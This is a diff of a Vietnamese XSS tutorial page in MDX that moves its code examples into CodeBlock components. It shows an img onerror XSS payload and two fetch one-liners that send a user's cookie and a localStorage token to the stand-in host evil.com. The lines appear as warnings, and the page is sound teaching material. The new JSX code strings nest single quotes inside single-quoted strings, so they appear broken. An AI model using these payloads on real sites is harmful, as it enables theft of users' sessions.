@@ -30,20 +30,54 @@ Người dùng có thể nhập URL của ảnh từ một trang web khác, và 
 
 Kẻ tấn công vô tình biết được điều này và đã lừa người dùng thay avatar của mình bằng một URL độc hại như sau:
 
-```html
-<img src="https://example.com/evil.png" onerror="alert('XSS!')" />
-
-```
+<CodeBlock
+  codePreview={false}
+  codeInstances={[
+    {
+      code: '<img src="https://example.com/evil.png" onerror="alert('XSS!')" />',
+      label: 'html',
+      language: 'html'
+    }
+  ]}
+  copyButton={true}
+  compact={true}
+/>
 
 `https://example.com/evil.png` là một ảnh không tồn tại, vì vậy trình duyệt sẽ không thể tải được ảnh này và sẽ gọi hàm `onerror` để xử lý lỗi. Trong trường hợp này, hàm `onerror` sẽ thực thi mã JavaScript mà kẻ tấn công đã chèn vào, dẫn đến việc hiển thị thông báo "XSS!".
 
 Thay vì hiển thị thông báo, kẻ tấn công có thể thực hiện các hành động khác như gửi cookie của người dùng đến máy chủ của mình hoặc thực hiện các hành động khác trên trang web mà người dùng đang truy cập.
 
-Bạn nào mà còn lưu API key, token hay cookie trong localStorage hoặc sessionStorage thì không khác gì dâng token cho kẻ tấn công đâu nhé. Ví dụ thay vì `alert('XSS!')`, nếu là `fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)` hay `fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))` thì kẻ tấn công đã có thể lấy được cookie hay token của người dùng rồi.
+Bạn nào mà còn lưu API key, token hay cookie trong localStorage hoặc sessionStorage thì không khác gì dâng token cho kẻ tấn công đâu nhé. Ví dụ thay vì `alert('XSS!')`, nếu là:
 
-```javascript
+<CodeBlock
+  codePreview={false}
+  codeInstances={[
+    {
+      code: 'fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)',
+      label: 'javascript',
+      language: 'js'
+    }
+  ]}
+  copyButton={true}
+  compact={true}
+/>
 
----
+hay: 
+
+<CodeBlock
+  codePreview={false}
+  codeInstances={[
+    {
+      code: 'fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))',
+      label: 'javascript',
+      language: 'js'
+    }
+  ]}
+  copyButton={true}
+  compact={true}
+/>
+
+thì kẻ tấn công đã có thể lấy được cookie hay token của người dùng rồi.
 
 ## Các loại XSS phổ biến
 
